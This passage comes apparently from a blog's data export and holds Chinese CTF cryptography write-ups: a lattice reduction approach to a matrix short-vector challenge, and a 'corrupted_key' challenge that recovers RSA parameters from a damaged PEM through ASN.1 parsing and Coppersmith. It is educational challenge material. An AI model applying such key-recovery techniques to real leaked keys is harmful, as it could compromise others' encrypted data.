\\\\<br>0 &amp; 1 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot c_{0,1} &amp; 2^{200}\\cdot c_{1,1} &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 1 &amp; 2^{200}\\cdot c_{0,149} &amp; 2^{200}\\cdot c_{1,149} &amp; \\cdots &amp; 2^{200}\\cdot c_{9,149} \\\\ \\hline<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot N &amp; 0 &amp; \\cdots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 2^{200}\\cdot N &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 2^{200}\\cdot N<br>\\end{array}<br>\\right)<br>$$<br>可以看到 $A$ 左上角为一个 $150$ 维的单位阵，左下角为零阵，右上角为 $C$ 的转置数乘 $2^{200}$ ，右下角为一个 $10$ 维的单位阵数乘 $2^{200}\\cdot N$ ，这里乘不乘 $2^{200}$ 得到的结果都是一样的，但神奇的是不乘的话 LLL 耗时会长一些。<br>$A$ 跑一遍 LLL 后，取结果的左上角 $75\\times150$ 矩阵，记为 $B$ ，取 $B$ 的核记为 $D$ ，最后 $D$ 跑一遍 BKZ 后的最短向量即为所求。</p>\n<blockquote>\n<p>这里涉及到矩阵的核的概念，核也叫矩阵的零空间，比如 $M$ 的核是方程 $Mx=0$ 的所有解 $x$ 的集合。</p>\n</blockquote>\n<p>那么就不难看出有 $BD^T=O$ ，即 $B^TD=O$<br>至于 $C$ 为什么左边要拼接一个单位阵，回忆你已经遗忘的线性代数，这种操作是不是似曾相识？没错说的就是矩阵的求逆，求逆矩阵除了伴随矩阵法，还有一种方法就是初等变换法。<br>例如如下一个矩阵求逆<br>$$<br>M=<br>\\begin{pmatrix}<br>1 &amp; -4 &amp; -3 \\\\<br>1 &amp; -5 &amp; -3 \\\\<br>-1 &amp; 6 &amp; 4<br>\\end{pmatrix}<br>$$<br>在右边补上一个单位阵，得到<br>$$<br>A=<br>\\left(<br>\\begin{array}{ccc|ccc}<br>1 &amp; -4 &amp; -3 &amp; 1 &amp; 0 &amp; 0 \\\\<br>1 &amp; -5 &amp; -3 &amp; 0 &amp; 1 &amp; 0 \\\\<br>-1 &amp; 6 &amp; 4 &amp; 0 &amp; 0 &amp; 1<br>\\end{array}<br>\\right)<br>\\stackrel{初等行变换}{\\longrightarrow}<br>\\left(<br>\\begin{array}{ccc|ccc}<br>1 &amp; 0 &amp; 0 &amp; 2 &amp; 2 &amp; 3 \\\\<br>0 &amp; 1 &amp; 0 &amp; 1 &amp; -1 &amp; 0 \\\\<br>0 &amp; 0 &amp; 1 &amp; -1 &amp; 2 &amp; 1<br>\\end{array}<br>\\right)<br>$$<br>此时右边的矩阵 $M^{-1}$ 即为所求<br>究其原理，在进行初等行变换的时候，右边的矩阵“记录”下了我们的操作，可以表示为<br>$$<br>M^{-1}<br>\\left[<br>    M\\enspace I<br>\\right] =<br>\\left[<br>    I\\enspace M^{-1}<br>\\right]<br>$$<br>回到题目中来，有<br>$$<br>L<br>\\left[<br>    I \\enspace C^T<br>\\right]<br> \\enspace % \\enspace N=<br>\\left[<br>\\begin{matrix}<br>    B &amp; O \\\\<br>    R &amp; S<br>\\end{matrix}<br>\\right]<br>$$<br>至于右上角为何是一个 $75\\times10$ 的零阵，我也不知道，但 exp 既然这么断言，姑且就这么认为先，那么我们就推测<br>$$<br>L=<br>\\left[<br>\\begin{matrix}<br>    B \\\\<br>    R<br>\\end{matrix}<br>\\right]<br>,LC^T=<br>\\left[<br>\\begin{matrix}<br>    O \\\\<br>    S<br>\\end{matrix}<br>\\right]<br>(mod\\ N)<br>$$<br>即有<br>$$<br>\\left[<br>\\begin{matrix}<br>    B \\\\<br>    R<br>\\end{matrix}<br>\\right]C^T=<br>\\left[<br>\\begin{matrix}<br>    O \\\\<br>    S<br>\\end{matrix}<br>\\right](mod\\ N)<br>$$<br>得到 $BC^T=O\\ (mod\\ N)$ ，结合上面 $BD^T=O$ ，推测。。。推测不出来了，然后结合队里大手子的分析如下</p>\n<p>记题目中给出的两个矩阵为 $\\mathcal{A}$和$\\mathcal{B}$ ，有<br> $\\mathcal{A}\\mathcal{B} = C\\ (mod\\ N)$<br>若有 $B(\\mathcal{A}\\mathcal{B})^T = BC^T = O\\ (mod\\ N)$ ，则 $B$ 和 $C^T$ 互为左右零空间。<br>因此可以通过构造格 $L$ ，使得对格 $L$ 进行格基规约后可以得到一组基 $B$ 满足 $BC^T = O\\ (mod\\ N)$ ，即 $B$ 的基就是 $C^T$ 在模 $N$ 下的一个左零空间。<br>接下来对 $B$ 求解其零空间 $D^T$ 就得到了 $(\\mathcal{A}\\mathcal{B})^T$ 所在的那个空间上了，这里从有限域化为整数域，即 $D=\\mathcal{A}\\mathcal{B}$ ，然后因为 $\\mathcal{B}$ 中所求的行向量是一个短向量，且矩阵 $D^T$ 的行向量是 $\\mathcal{B}$ 的行向量的线性组合，因此对 $D^T$ 进行格基规约算法就可以把 $\\mathcal{B}$ 的短向量给恢复出来。</p>\n<p>至此已经有明悟的感觉，但仍是有少许不解，消化一段时间吧。</p>\n","site":{"data":{}},"excerpt":"<p>当场做是做不出来的，赛后分析学学吧，不定期更新。</p>","more":"<h2 id=\"Lattice\"><a href=\"#Lattice\" class=\"headerlink\" title=\"Lattice\"></a>Lattice</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> sage.modules.free_module_integer <span class=\"keyword\">import</span> IntegerLattice</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b64encode</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"><span class=\"keyword\">import</span> signal</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">75</span></span><br><span class=\"line\">m = <span class=\"number\">150</span></span><br><span class=\"line\">r = <span class=\"number\">10</span></span><br><span class=\"line\">N = <span class=\"number\">126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">gen</span>(<span class=\"params\">n, m, r, N</span>):</span><br><span class=\"line\">    t1 = [ZZ.random_element(-<span class=\"number\">2</span>^<span class=\"number\">15</span>, <span class=\"number\">2</span>^<span class=\"number\">15</span>) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n*m)]</span><br><span class=\"line\">    t2 = [ZZ.random_element(N) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(r*n)]</span><br><span class=\"line\">    B = matrix(ZZ, n, m, t1)        <span class=\"comment\"># B为75*150的矩阵</span></span><br><span class=\"line\">    L = IntegerLattice(B)</span><br><span class=\"line\">    A = matrix(ZZ, r, n, t2)        <span class=\"comment\"># A为10*75的矩阵</span></span><br><span class=\"line\">    C = (A * B) % N                 <span class=\"comment\"># C为10*150的矩阵</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> L, C</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pad</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> s + (<span class=\"number\">16</span> - <span class=\"built_in\">len</span>(s) % <span class=\"number\">16</span>) * <span class=\"string\">b&quot;\\x00&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">signal.alarm(<span class=\"number\">60</span>)</span><br><span class=\"line\">token = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;team token:&quot;</span>).strip().encode()</span><br><span class=\"line\">L, C = gen(n, m, r, N)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(C)</span><br><span class=\"line\">key = sha256(<span class=\"built_in\">str</span>(L.reduced_basis[<span class=\"number\">0</span>]).encode()).digest()</span><br><span class=\"line\">aes = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">ct = b64encode(aes.encrypt(pad(flag))).decode()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ct)</span><br></pre></td></tr></table></figure>\n\n<p>题目生成了一个元素在 $[-2^{15},2^{15}]$ 间的矩阵 $B_{75\\times150}$ ，和 $Z_N$ 上的矩阵 $A_{10\\times75}$ 。然后给了一个两矩阵相乘再模 $N$ 的结果 $C$ ，即 $C=AB(mod\\ N)$ ，需要我们恢复出原来格$B$的最短向量。</p>\n<p>比赛时尝试过构造 $\\left[ C \\enspace NI\\right]^T$ ，跑LLL出来的结果很差， BKZ 的话一晚上啥也没出来。。<br>赛后只找到 Nu1L 队的 wp ，but 也只有个 exp ，一句解释都没，像我这样的菜鸡分析起来就十分吃力了，但聊胜于无嘛，其他几个队连个 wp 都不放呜呜呜。</p>\n<p>exp中构造了一个 $m+r=150+10=160$ 维的方阵 $A$ 如下：<br>$$<br>A=<br>\\left(<br>\\begin{array}{cccc|cccc}<br>1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot c_{0,0} &amp; 2^{200}\\cdot c_{1,0} &amp; \\cdots &amp; 2^{200}\\cdot c_{9,0} \\\\<br>0 &amp; 1 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot c_{0,1} &amp; 2^{200}\\cdot c_{1,1} &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 1 &amp; 2^{200}\\cdot c_{0,149} &amp; 2^{200}\\cdot c_{1,149} &amp; \\cdots &amp; 2^{200}\\cdot c_{9,149} \\\\ \\hline<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 2^{200}\\cdot N &amp; 0 &amp; \\cdots &amp; 0 \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 2^{200}\\cdot N &amp; \\cdots &amp; 0 \\\\<br>\\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br>0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 2^{200}\\cdot N<br>\\end{array}<br>\\right)<br>$$<br>可以看到 $A$ 左上角为一个 $150$ 维的单位阵，左下角为零阵，右上角为 $C$ 的转置数乘 $2^{200}$ ，右下角为一个 $10$ 维的单位阵数乘 $2^{200}\\cdot N$ ，这里乘不乘 $2^{200}$ 得到的结果都是一样的，但神奇的是不乘的话 LLL 耗时会长一些。<br>$A$ 跑一遍 LLL 后，取结果的左上角 $75\\times150$ 矩阵，记为 $B$ ，取 $B$ 的核记为 $D$ ，最后 $D$ 跑一遍 BKZ 后的最短向量即为所求。</p>\n<blockquote>\n<p>这里涉及到矩阵的核的概念，核也叫矩阵的零空间，比如 $M$ 的核是方程 $Mx=0$ 的所有解 $x$ 的集合。</p>\n</blockquote>\n<p>那么就不难看出有 $BD^T=O$ ，即 $B^TD=O$<br>至于 $C$ 为什么左边要拼接一个单位阵，回忆你已经遗忘的线性代数，这种操作是不是似曾相识？没错说的就是矩阵的求逆，求逆矩阵除了伴随矩阵法，还有一种方法就是初等变换法。<br>例如如下一个矩阵求逆<br>$$<br>M=<br>\\begin{pmatrix}<br>1 &amp; -4 &amp; -3 \\\\<br>1 &amp; -5 &amp; -3 \\\\<br>-1 &amp; 6 &amp; 4<br>\\end{pmatrix}<br>$$<br>在右边补上一个单位阵，得到<br>$$<br>A=<br>\\left(<br>\\begin{array}{ccc|ccc}<br>1 &amp; -4 &amp; -3 &amp; 1 &amp; 0 &amp; 0 \\\\<br>1 &amp; -5 &amp; -3 &amp; 0 &amp; 1 &amp; 0 \\\\<br>-1 &amp; 6 &amp; 4 &amp; 0 &amp; 0 &amp; 1<br>\\end{array}<br>\\right)<br>\\stackrel{初等行变换}{\\longrightarrow}<br>\\left(<br>\\begin{array}{ccc|ccc}<br>1 &amp; 0 &amp; 0 &amp; 2 &amp; 2 &amp; 3 \\\\<br>0 &amp; 1 &amp; 0 &amp; 1 &amp; -1 &amp; 0 \\\\<br>0 &amp; 0 &amp; 1 &amp; -1 &amp; 2 &amp; 1<br>\\end{array}<br>\\right)<br>$$<br>此时右边的矩阵 $M^{-1}$ 即为所求<br>究其原理，在进行初等行变换的时候，右边的矩阵“记录”下了我们的操作，可以表示为<br>$$<br>M^{-1}<br>\\left[<br>    M\\enspace I<br>\\right] =<br>\\left[<br>    I\\enspace M^{-1}<br>\\right]<br>$$<br>回到题目中来，有<br>$$<br>L<br>\\left[<br>    I \\enspace C^T<br>\\right]<br> \\enspace % \\enspace N=<br>\\left[<br>\\begin{matrix}<br>    B &amp; O \\\\<br>    R &amp; S<br>\\end{matrix}<br>\\right]<br>$$<br>至于右上角为何是一个 $75\\times10$ 的零阵，我也不知道，但 exp 既然这么断言，姑且就这么认为先，那么我们就推测<br>$$<br>L=<br>\\left[<br>\\begin{matrix}<br>    B \\\\<br>    R<br>\\end{matrix}<br>\\right]<br>,LC^T=<br>\\left[<br>\\begin{matrix}<br>    O \\\\<br>    S<br>\\end{matrix}<br>\\right]<br>(mod\\ N)<br>$$<br>即有<br>$$<br>\\left[<br>\\begin{matrix}<br>    B \\\\<br>    R<br>\\end{matrix}<br>\\right]C^T=<br>\\left[<br>\\begin{matrix}<br>    O \\\\<br>    S<br>\\end{matrix}<br>\\right](mod\\ N)<br>$$<br>得到 $BC^T=O\\ (mod\\ N)$ ，结合上面 $BD^T=O$ ，推测。。。推测不出来了，然后结合队里大手子的分析如下</p>\n<p>记题目中给出的两个矩阵为 $\\mathcal{A}$和$\\mathcal{B}$ ，有<br> $\\mathcal{A}\\mathcal{B} = C\\ (mod\\ N)$<br>若有 $B(\\mathcal{A}\\mathcal{B})^T = BC^T = O\\ (mod\\ N)$ ，则 $B$ 和 $C^T$ 互为左右零空间。<br>因此可以通过构造格 $L$ ，使得对格 $L$ 进行格基规约后可以得到一组基 $B$ 满足 $BC^T = O\\ (mod\\ N)$ ，即 $B$ 的基就是 $C^T$ 在模 $N$ 下的一个左零空间。<br>接下来对 $B$ 求解其零空间 $D^T$ 就得到了 $(\\mathcal{A}\\mathcal{B})^T$ 所在的那个空间上了，这里从有限域化为整数域，即 $D=\\mathcal{A}\\mathcal{B}$ ，然后因为 $\\mathcal{B}$ 中所求的行向量是一个短向量，且矩阵 $D^T$ 的行向量是 $\\mathcal{B}$ 的行向量的线性组合，因此对 $D^T$ 进行格基规约算法就可以把 $\\mathcal{B}$ 的短向量给恢复出来。</p>\n<p>至此已经有明悟的感觉，但仍是有少许不解，消化一段时间吧。</p>"},{"title":"2022蓝帽杯 - corrupted_key","date":"2022-07-16T05:08:00.000Z","_content":"\n很有意思的一道题，涉及私钥文件的结构。\n<!--more-->\n********************************\n\n## 题目\n\n给了一个`priv.pem`\n\n```plain\n-----BEGIN RSA PRIVATE KEY-----\nMIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH\nUFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm\ndJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB\n\n\n\n\n\n\n\n\nyQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c\nzUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==\n-----END RSA PRIVATE KEY-----\n```\n\n和一个加密的脚本\n\n```python\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom secret import flag\n\nkey = RSA.generate(1024)\nopen(\"flag.enc\",'wb').write(PKCS1_OAEP.new(key.publickey()).encrypt(flag))\nopen('priv.pem','wb').write(key.exportKey('PEM'))\n```\n\n然后就是 `flag.enc`\n\n## 分析\n\n### 数理部分\n\n题目名为 **corrupted_key** ，意为残损的私钥文件，既然是残损的，那么剩下的部分就是解题的关键了。\n通过查看 `Crypto.PublicKey.RSA` 的源码，发现私钥文件的结构是：\n\n```plain\n0 （注意！！！！）\nn\ne\np\nq\nd mod (p-1)\nd mod (q-1)\n(inverse of q) mod p\n```\n\n完整来说是\n\n```plain\nRSAPrivateKey ::= SEQUENCE {\nversion Version,\nmodulus INTEGER, -- n\npublicExponent INTEGER, -- e\nprivateExponent INTEGER, -- d\nprime1 INTEGER, -- p\nprime2 INTEGER, -- q\nexponent1 INTEGER, -- d mod (p-1)\nexponent2 INTEGER, -- d mod (q-1)\ncoefficient INTEGER, -- (inverse of q) mod p\notherPrimeInfos OtherPrimeInfos OPTIONAL\n}\n```\n\n一通操作后发现可以拿到 $n$,$e$,CRT 系数（即 $q^{-1}mod\\ p$ ）和 $d_q$ 低位，至于怎么拿到的等下再说，这里可以构造等式如下：\n$$\n    t = q^{-1} \\ (mod \\ p) \\\\\\\\\n    tq-1 = 0 \\ (mod \\ p) \\\\\\\\\n    tq^2 - q = 0 \\ (mod \\ n)\n$$\n然后\n$$\n    ed_q = 1 \\ (mod \\ q - 1) \\\\\\\\\n    ed_q - 1 = k(q - 1) \\\\\\\\\n    f = (dq_h + dq_l)e - 1 + k = kq\n$$\n代入得\n$$\n    tf^2 - kf = 0 \\ (mod \\ n)\n$$\n显然 $k$ 和 $e$ 数量级是相当的， $dq_h$ 的未知高位有512-120=392位，就可以通过 coppersmith 爆破 $k$ 。\n\n### 参数提取\n\n然后就是有意思的部分了，如何从残损的私钥文件中提取参数呢？\n对着源码一顿调试了几个钟（太菜了呜呜），发现是先将各个参数塞进一个首位为 0 的数组，然后各个参数前面补上长度，后面 `long_to_bytes` 转换成 bytes ，最后拼接起来。\n我的提取脚本如下：\n\n```python\nfrom binascii import a2b_base64\nfrom Crypto.Util.asn1 import DerInteger\nfrom Crypto.Util.number import *\npem = '''-----BEGIN RSA PRIVATE KEY-----\nMIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH\nUFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm\ndJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB\n\nyQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c\nzUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==\n-----END RSA PRIVATE KEY-----'''\n\npemlist = pem.split('\\n')\ndecode_b64 = b''\nfor i in pemlist[1:-1]:\n    decode_b64+=a2b_base64(i)\ndecode_b64 = decode_b64[4:] # 丢弃前4个字节\n\nder_int = DerInteger()\n\n# 提取n\nn = decode_b64[3:135]\nder_int.decode(n)\nprint('[+] n =',n:=der_int.value)\n\n# 提取e\ne = decode_b64[135:140]\nder_int.decode(e)\nprint('[+] e =',e:=der_int.value)\n\n# 提取CRT系数\nfor len in range(1,300):\n    try:\n        q_inv_p = decode_b64[-len:]\n        der_int.decode(q_inv_p)\n        print('[+] q_inv_p =',q_inv_p:=der_int.value)\n    except:\n        len+=1\n    else:\n        # print(len)    # 67\n        break\n# print(q_inv_p.bit_length())   # 512\n\n# 提取dp低位\ndp_l = decode_b64[-82:-67]\n# print(dp_l)\nprint('[+] dp_l =',bytes_to_long(dp_l))\n```\n\n可以看到我一开始直接把前 4 个字节丢了，然后在新 List 里用库函数解析 3 - 134 号位的数据，这部分就是属于 $n$ 的，然而实际上 `bytes_to_long` 解析 7 - 134 号位的数据得到的也是 $n$ ，那么问题来了， 3 - 6 号位这 4 个字节里放了啥？\n\n以下是新List：\n\n```plain\n\\x02\\x01\\x00\\x02\\x81\\x81\\x00\\xd7\\x15%\\x06\\xaa\\x9c...\n```\n\n这里涉及一个**ASN.1**（Abstract Syntax Notation dot one，即抽象记法1）的问题，简单来说就是将数据编码成 3 个部分：**标志域、长度域、值域**\n标志域中，约定 02 表示整数\n长度域稍微复杂些，记录的是值域的长度，分为定长和不定长两种情况\n定长时，若值域长度不超过 127 ，则用**短格式**表示，也就是直接用 16 进制表示，比如长度为 31 就是 0x1F ，即 0001 1111 ；若长度超过 127 ，则用**长格式**表示，首字节的首位置 1 表示长格式，后面7位则表示后面再跟多少个表示长度的字节，比如 1000 0001 表示后面 1 个字节表示长度，后面的长度也是直接用 16 进制表示。\n现在可以看到新 List 中， 0 号位为 02 表示整数， 1 号位 01 表示长度为 1 ， 2 号位 00 表示数据为 0 ，这就是上面提到的私钥文件结构中的那个 0 。\n再继续分析， 3 号位 02 表示数据为整数， 4 号位中的首比特为1表示使用长格式，后面 7 个比特为 000 0001 意为数据长度用 1 个字节表示，没错就是后面紧跟的 5 号位，表示数据长度为 0x81 ，转换成 10 进制就是 129 ，试了一下 6 - 134 号位用 `bytes_to_long` 解析出来的数据，也是 $n$\n那么现在你应该也可以尝试写出 $e$ 的编码：\n\n```plain\n\\x02\\x03\\x01\\x00\\x01\n```\n\n细心的你还发现我开头扔了 4 个字节，猜猜是啥呢？\n答案是整个私钥文件编码后作为值域前面补的标签域和长度域，最前面再补一个 0 ，也就是\n\n```plain\n0\\x82\\x02^\n```\n\n后两个字节 `bytes_to_long` 解码后是 606 ，恰为后面跟的完整数据的长度\n\n> 后来偶然间发现竟然有类似的题目（）\n[0CTF 2016 Quals equation](https://ctftime.org/task/2127)\n\n## 参考\n\n<https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ>\n<https://www.likecs.com/show-40060.html>\n","source":"_posts/2022蓝帽杯 - corrupted_key.md","raw":"---\ntitle: 2022蓝帽杯 - corrupted_key\ndate: 2022-07-16 13:08:00\ntags: [CTF, 密码学]\ncategories: 题解\n---\n\n很有意思的一道题，涉及私钥文件的结构。\n<!--more-->\n********************************\n\n## 题目\n\n给了一个`priv.pem`\n\n```plain\n-----BEGIN RSA PRIVATE KEY-----\nMIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH\nUFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm\ndJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB\n\n\n\n\n\n\n\n\nyQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c\nzUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==\n-----END RSA PRIVATE KEY-----\n```\n\n和一个加密的脚本\n\n```python\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom secret import flag\n\nkey = RSA.generate(1024)\nopen(\"flag.enc\",'wb').write(PKCS1_OAEP.new(key.publickey()).encrypt(flag))\nopen('priv.pem','wb').write(key.exportKey('PEM'))\n```\n\n然后就是 `flag.enc`\n\n## 分析\n\n### 数理部分\n\n题目名为 **corrupted_key** ，意为残损的私钥文件，既然是残损的，那么剩下的部分就是解题的关键了。\n通过查看 `Crypto.PublicKey.RSA` 的源码，发现私钥文件的结构是：\n\n```plain\n0 （注意！！！！）\nn\ne\np\nq\nd mod (p-1)\nd mod (q-1)\n(inverse of q) mod p\n```\n\n完整来说是\n\n```plain\nRSAPrivateKey ::= SEQUENCE {\nversion Version,\nmodulus INTEGER, -- n\npublicExponent INTEGER, -- e\nprivateExponent INTEGER, -- d\nprime1 INTEGER, -- p\nprime2 INTEGER, -- q\nexponent1 INTEGER, -- d mod (p-1)\nexponent2 INTEGER, -- d mod (q-1)\ncoefficient INTEGER, -- (inverse of q) mod p\notherPrimeInfos OtherPrimeInfos OPTIONAL\n}\n```\n\n一通操作后发现可以拿到 $n$,$e$,CRT 系数（即 $q^{-1}mod\\ p$ ）和 $d_q$ 低位，至于怎么拿到的等下再说，这里可以构造等式如下：\n$$\n    t = q^{-1} \\ (mod \\ p) \\\\\\\\\n    tq-1 = 0 \\ (mod \\ p) \\\\\\\\\n    tq^2 - q = 0 \\ (mod \\ n)\n$$\n然后\n$$\n    ed_q = 1 \\ (mod \\ q - 1) \\\\\\\\\n    ed_q - 1 = k(q - 1) \\\\\\\\\n    f = (dq_h + dq_l)e - 1 + k = kq\n$$\n代入得\n$$\n    tf^2 - kf = 0 \\ (mod \\ n)\n$$\n显然 $k$ 和 $e$ 数量级是相当的， $dq_h$ 的未知高位有512-120=392位，就可以通过 coppersmith 爆破 $k$ 。\n\n### 参数提取\n\n然后就是有意思的部分了，如何从残损的私钥文件中提取参数呢？\n对着源码一顿调试了几个钟（太菜了呜呜），发现是先将各个参数塞进一个首位为 0 的数组，然后各个参数前面补上长度，后面 `long_to_bytes` 转换成 bytes ，最后拼接起来。\n我的提取脚本如下：\n\n```python\nfrom binascii import a2b_base64\nfrom Crypto.Util.asn1 import DerInteger\nfrom Crypto.Util.number import *\npem = '''-----BEGIN RSA PRIVATE KEY-----\nMIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH\nUFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm\ndJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB\n\nyQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c\nzUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==\n-----END RSA PRIVATE KEY-----'''\n\npemlist = pem.split('\\n')\ndecode_b64 = b''\nfor i in pemlist[1:-1]:\n    decode_b64+=a2b_base64(i)\ndecode_b64 = decode_b64[4:] # 丢弃前4个字节\n\nder_int = DerInteger()\n\n# 提取n\nn = decode_b64[3:135]\nder_int.decode(n)\nprint('[+] n =',n:=der_int.value)\n\n# 提取e\ne = decode_b64[135:140]\nder_int.decode(e)\nprint('[+] e =',e:=der_int.value)\n\n# 提取CRT系数\nfor len in range(1,300):\n    try:\n        q_inv_p = decode_b64[-len:]\n        der_int.decode(q_inv_p)\n        print('[+] q_inv_p =',q_inv_p:=der_int.value)\n    except:\n        len+=1\n    else:\n        # print(len)    # 67\n        break\n# print(q_inv_p.bit_length())   # 512\n\n# 提取dp低位\ndp_l = decode_b64[-82:-67]\n# print(dp_l)\nprint('[+] dp_l =',bytes_to_long(dp_l))\n```\n\n可以看到我一开始直接把前 4 个字节丢了，然后在新 List 里用库函数解析 3 - 134 号位的数据，这部分就是属于 $n$ 的，然而实际上 `bytes_to_long` 解析 7 - 134 号位的数据得到的也是 $n$ ，那么问题来了， 3 - 6 号位这 4 个字节里放了啥？\n\n以下是新List：\n\n```plain\n\\x02\\x01\\x00\\x02\\x81\\x81\\x00\\xd7\\x15%\\x06\\xaa\\x9c...\n```\n\n这里涉及一个**ASN.1**（Abstract Syntax Notation dot one，即抽象记法1）的问题，简单来说就是将数据编码成 3 个部分：**标志域、长度域、值域**\n标志域中，约定 02 表示整数\n长度域稍微复杂些，记录的是值域的长度，分为定长和不定长两种情况\n定长时，若值域长度不超过 127 ，则用**短格式**表示，也就是直接用 16 进制表示，比如长度为 31 就是 0x1F ，即 0001 1111 ；若长度超过 127 ，则用**长格式**表示，首字节的首位置 1 表示长格式，后面7位则表示后面再跟多少个表示长度的字节，比如 1000 0001 表示后面 1 个字节表示长度，后面的长度也是直接用 16 进制表示。\n现在可以看到新 List 中， 0 号位为 02 表示整数， 1 号位 01 表示长度为 1 ， 2 号位 00 表示数据为 0 ，这就是上面提到的私钥文件结构中的那个 0 。\n再继续分析， 3 号位 02 表示数据为整数， 4 号位中的首比特为1表示使用长格式，后面 7 个比特为 000 0001 意为数据长度用 1 个字节表示，没错就是后面紧跟的 5 号位，表示数据长度为 0x81 ，转换成 10 